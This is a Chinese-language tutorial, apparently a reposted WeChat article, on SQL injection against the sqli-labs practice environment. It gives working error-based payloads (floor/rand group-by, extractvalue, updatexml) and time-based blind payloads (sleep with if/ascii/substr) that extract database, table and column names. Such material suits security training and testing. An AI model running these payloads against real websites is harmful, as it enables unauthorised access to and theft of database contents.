\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/YeMARRFipY-7HUePN3z2eg)

没有人不辛苦，只是有人不喊疼。。。

\----  网易云热评

环境：sqli

一、报错注入

1、判断是否存在报错

http://192.168.77.128/sqli/Less-2/?id=1'

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFPmhkh9Kzj01VeEjpgQIIJlT5m8C6esT5xjTkGvI15jqDmRsZC4icTFA/640?wx_fmt=png)

2、group by 虚拟表主键重复冲突

查看数据库版本号

```
http://192.168.77.128/sqli/Less-2/?id=1 and (select 1 from (select count(\*),concat(0x23,(select version()),0x23,floor(rand(0)\*2))x from in
formation\_schema.tables group by x)a limit 1)
```

运行结果：

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJF8LW1Sjy1ry0oocLOc5XfKG7bfcrfFUiberrhboiczicDqxUoD5aocRthg/640?wx_fmt=png)

获取数据库名称

```
http://192.168.77.128/sqli/Less-2/?id=1 and (select 1 from (select count(\*),concat(0x23,(select database()),0x23,floor(rand(0)\*2))x from in
formation\_schema.tables group by x)a limit 1)
```

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFyN3eshV5WMYVc68nhdL372z1bFsgvTSICZSoKV7lEPmaH0oofJsM4A/640?wx_fmt=png)

3、extractvalue() 函数

获取 sercurity 数据库中的表名，通过修改 limit 后面的数字获取该数据库不同的表名

```
http://192.168.77.128/sqli/Less-2/?id=1 and extractvalue(1,concat(0x23,(select table\_name from information\_schema.tables where table\_schema=database() limit 3,1),0x23))
```

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFvuTjcpYOcIA1RyBTporr3YoNjicYAa8111caddW3cScusgAonz6YJRw/640?wx_fmt=png)

4、updatexml() 函数

获取 user 表名中的字段, 通过修改 limit 后面的数字获取该数据库不同的字段

```
http://192.168.77.128/sqli/Less-2/?id=1 and updatexml(2,concat(0x23,(select column\_name from information\_schema.columns where table\_schema=database() and table\_name='users' limit 1,1),0x23),1)
```

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFv2lLlz6raPAARibXeHmVNGrV0H26F4zY9MG7LAqOickQuIJfajUJO1uA/640?wx_fmt=png)

二、延时注入

1、判断字符注入

http://192.168.77.128/sqli/Less-8/?id=1' and 1=2 --+ 报错

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJF66BoC7v9M87rQsJXug6GZKGAMPgFnCALicxb8PS23m5ibDzYcztwpAcA/640?wx_fmt=png)

http://192.168.77.128/sqli/Less-8/?id=1' and 1=1 --+ 正常

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJF0wbxVmMfwNhcVibyqwfNHYjTDzKd4Xb1IeAV4iaU8ibjb0icqhQYNSMwaQ/640?wx_fmt=png)

2、判断是否存在延时

```
http://192.168.77.128/sqli/Less-8/?id=1' and sleep(5) --+  延长5秒再执行
```

```
http://192.168.77.128/sqli/Less-8/?id=1 and sleep(5) --+ 没有延长
```

3、if 与 sleep 结合使用

```
if(exp1,exp2,exp3):如果exp1为真，返回exp2，否则返回exp3
```

4、判断数据库长度

```
http://192.168.77.128/sqli/Less-8/?id=1' and if(length(database())>=8,sleep(5),1) --+
```

5、判断数据库名字的第一个字母

```
http://192.168.77.128/sqli/Less-8/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+
```

延时 5 秒，说明数据库的第一个字母的 ASCII 码为 115，即 s

6、根据以前内容，可以获取表名和字段名。

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFuShHeuwia6AgwyQoyaO62I2VBicJo3Xl1kjTz01jleLicrV3fEr6yibmhg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibuhDgYKiaO4noInjx8FbMgJFCFQbopjCxXEUf3lOLibcy6VFP3YSVT3AbXCzeYcPMcEHeQeFKFrBWGg/640?wx_fmt=png)